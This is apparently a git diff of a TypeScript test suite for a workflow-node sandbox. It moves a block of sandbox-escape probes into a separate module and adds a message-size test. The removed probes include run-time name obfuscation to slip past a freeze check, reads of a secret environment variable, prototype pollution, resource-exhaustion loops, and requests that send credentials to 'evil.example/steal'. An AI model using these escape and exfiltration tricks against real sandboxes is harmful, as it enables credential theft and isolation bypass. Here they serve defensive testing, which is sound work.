@@ -11,11 +11,13 @@ import type { IDataObject, IHttpRequestOptions, INode, INodeType } from 'n8n-wor
 
 import { compat, defineCredential, field } from '../credentials';
 import { setPermissionRefusalListener, type PermissionRefusal } from '../egress';
-import { freezeAction, GUEST_LACKS } from '../freeze';
+import { escapeProbes } from './escape-probes';
+import { freezeAction } from '../freeze';
 import { defineNode, t } from '../index';
 import { runRecorder } from '../profile';
 import { replayFixtures } from '../publish';
 import {
+	connectLines,
 	policyExecutorLoader,
 	sandboxedVersionOf,
 	warmSandbox,
@@ -59,154 +61,6 @@ const node: INode = {
 	position: [0, 0],
 	parameters: {},
 };
-
-const PROBES = (port: number) => `import { defineNode, t } from '@n8n/node-sdk';
-import { compat, credential, defineCredential, field } from '@n8n/node-sdk/credentials';
-const { binary, obj, str } = t;
-const probe = defineNode({ id: 'probe', displayName: 'Probe' });
-const acmeToken = defineCredential({
-	id: 'acme.token',
-	legacyName: 'acmeApi',
-	displayName: 'Acme API',
-	fields: { account: field.text('Account ID'), apiKey: field.secret('API Key') },
-	baseUrl: 'https://api.acme.test',
-	auth: (a) => a.bearer('apiKey'),
-});
-const acme = defineNode({ id: 'acme', displayName: 'Acme', credential: credential({ types: [acmeToken] }) });
-const slackApi = compat('slackApi', { hosts: ['evil.example'] });
-const thief = defineNode({
-	id: 'thief',
-	displayName: 'Thief',
-	credential: credential({ types: [slackApi] }),
-});
-const baseThief = defineNode({
-	id: 'baseThief',
-	displayName: 'Base Thief',
-	baseUrl: 'https://evil.example',
-	credential: credential({ types: [slackApi] }),
-});
-const spec = (run: (context: any) => Promise<unknown>, extra: Record<string, unknown> = {}, node: any = probe) =>
-	node.action('probe', {
-		action: 'Probe',
-		summary: 'Probe the sandbox.',
-		flow: { effect: 'read', cardinality: 'per-item' },
-		input: {},
-		output: obj({ value: str() }),
-		...extra,
-		run,
-	} as any);
-const canary = 'http://127.0.0.1:${port}/';
-// Names built at run time pass the freeze check, so the sandbox must stop them.
-export const fetchProbe = spec(async () => ({ value: String(await (globalThis as any)[['fet', 'ch'].join('')](canary)) }));
-export const processProbe = spec(async () => ({ value: String((globalThis as any)[['pro', 'cess'].join('')].env.SANDBOX_CANARY) }));
-export const importProbe = spec(async () => ({ value: String(await import(['node', 'fs'].join(':'))) }));
-export const globalsProbe = spec(async () => ({
-	value: JSON.stringify(${JSON.stringify(GUEST_LACKS)}.filter((name) => name in globalThis)),
-}));
-export const timerProbe = spec(async ({ http }) => {
-	(globalThis as any)[['set', 'Timeout'].join('')](() => void http.request({ url: canary }), 0);
-	return { value: 'scheduled' };
-});
-export const loopProbe = spec(async () => {
-	for (;;) {}
-});
-export const memoryProbe = spec(async () => {
-	const kept: unknown[] = [];
-	for (;;) kept.push(new Array(1_000_000).fill(kept.length));
-});
-export const undeclaredProbe = spec(async (context) => ({
-	value: String(await context.dataTables.open({ name: 'secrets' })),
-}));
-export const egressProbe = spec(
-	async ({ http }) => ({ value: String(await http.request({ url: 'https://evil.example/steal' })) }),
-	{ egress: { hosts: ['api.example.com'] } },
-);
-export const inputUrlProbe = spec(
-	async ({ input, http }) => ({ value: String(await http.request({ url: input.url })) }),
-	{ egress: { fromInput: 'url' }, input: { url: str() } },
-);
-export const noEgressProbe = spec(async ({ http }) => ({
-	value: String(await http.request({ url: 'https://api.example.com/steal' })),
-}));
-export const credentialHostProbe = spec(
-	async ({ http }) => ({ value: String(await http.request({ url: 'https://evil.example/steal' })) }),
-	{ egress: { hosts: ['evil.example'] } },
-	thief,
-);
-export const baseUrlProbe = spec(async ({ http }) => ({ value: String(await http.request({ path: '/steal' })) }), {}, baseThief);
-export const pollutionProbe = spec(async () => {
-	(Object.prototype as any).polluted = 'yes';
-	return { value: String(({} as any).polluted) };
-});
-export const randomProbe = spec(async () => ({
-	value: [Math.random(), crypto.getRandomValues(new Uint32Array(2)).join('-'), crypto.randomUUID()].join(' '),
-}));
-export const echoProbe = spec(async ({ http }) => ({
-	value: JSON.stringify(await http.request({ url: 'https://api.example.com/echo', fullResponse: true })),
-}), { egress: { hosts: ['api.example.com'] } });
-export const failureProbe = spec(async ({ http }) => {
-	try {
-		return { value: String(await http.request({ url: 'https://api.example.com/missing' })) };
-	} catch (error) {
-		return { value: JSON.stringify(error.headers) };
-	}
-}, { egress: { hosts: ['api.example.com'] } });
-export const canaryProbe = spec(
-	async ({ input, http }) => ({
-		value: JSON.stringify(await http.request({ method: 'POST', url: 'https://api.acme.test/echo', body: { note: input.note } })),
-	}),
-	{ egress: { hosts: ['api.acme.test'] }, input: { note: str() } },
-	acme,
-);
-export const credentialProbe = spec(async ({ credential }) => ({ value: JSON.stringify(credential) }), {}, acme);
-export const credentialErrorProbe = spec(async (context) => {
-	try {
-		return { value: JSON.stringify(context.credential) };
-	} catch (error) {
-		return { value: String(error.message) };
-	}
-}, {}, acme);
-export const binaryProbe = spec(
-	async ({ input, http, binary: files }) => {
-		const chunks: Uint8Array[] = [];
-		for await (const chunk of input.file.read()) chunks.push(chunk);
-		const copy = await files.create({ mimeType: 'application/octet-stream', fileName: 'copy.bin' }, chunks);
-		const sent = await http.request({ method: 'POST', url: 'https://api.example.com/upload', body: copy });
-		const fetched = await http.request({ url: 'https://api.example.com/file', response: 'binary' });
-		const size = chunks.reduce((sum, chunk) => sum + chunk.length, 0);
-		const value = JSON.stringify({ size, chunks: chunks.length, meta: input.file.meta, sent, fetched: fetched.meta });
-		return { value, copy, fetched };
-	},
-	{
-		input: { file: binary() },
-		output: obj({ value: str(), copy: binary(), fetched: binary() }),
-		egress: { hosts: ['api.example.com'] },
-	},
-);
-export const parsersProbe = spec(
-	async ({ input, parsers }) => ({
-		value: JSON.stringify(await parsers.extract(input.file, 'csv', { delimiter: ';', header: false })),
-	}),
-	{ input: { file: binary() }, imports: ['parsers'] },
-);
-export const migrateProbe = spec(async ({ input }) => ({ value: input.message }), {
-	version: 2,
-	input: { message: str() },
-	migrate: (fromMajor: number, params: any) => ({ message: String(params.text) }),
-});
-export const openStreamsProbe = spec(
-	async ({ input, binary: files }) => {
-		for await (const _chunk of input.file.read()) break;
-		const failing = async function* () {
-			yield 'part';
-			throw new Error('chunks failed');
-		};
-		await files.create({ mimeType: 'text/plain' }, failing()).catch(() => undefined);
-		return { value: 'done' };
-	},
-	{ input: { file: binary() } },
-);
-`;
 
 const PROBE_NAMES = [
 	'fetchProbe',
@@ -273,6 +127,21 @@ const recordedMethods = (methods: string[]): GuestRuntime => {
 	};
 };
 
+describe('connectLines', () => {
+	it('measures the message limit in UTF-8 bytes', async () => {
+		const connection = connectLines(
+			{ write: () => undefined, stop: () => undefined },
+			{
+				limits: { memoryMb: 64, cpuMs: 1_000, wallMs: 1_000, maxMessageBytes: 20 },
+				label: 'probe',
+			},
+		);
+		const request = connection.request('run', {});
+		connection.receive(`{"method":"${'é'.repeat(7)}"}`);
+		await expect(request).rejects.toThrow('probe gave a message larger than 20 bytes');
+	});
+});
+
 describe.skipIf(!existsSync(SIDECAR) || !existsSync(GUEST))('the sandbox', () => {
 	const dirs = { root: '' };
 	const canary = { hits: 0, server: undefined as Server | undefined };
@@ -321,7 +190,7 @@ describe.skipIf(!existsSync(SIDECAR) || !existsSync(GUEST))('the sandbox', () =>
 		});
 		await new Promise<void>((resolve) => canary.server?.listen(0, '127.0.0.1', resolve));
 		const { port } = canary.server.address() as AddressInfo;
-		await writeFile(path.join(dirs.root, 'probes.ts'), PROBES(port));
+		await writeFile(path.join(dirs.root, 'probes.ts'), escapeProbes(`http://127.0.0.1:${port}/`));
 		process.env.SANDBOX_CANARY = 'secret';
 	});
 
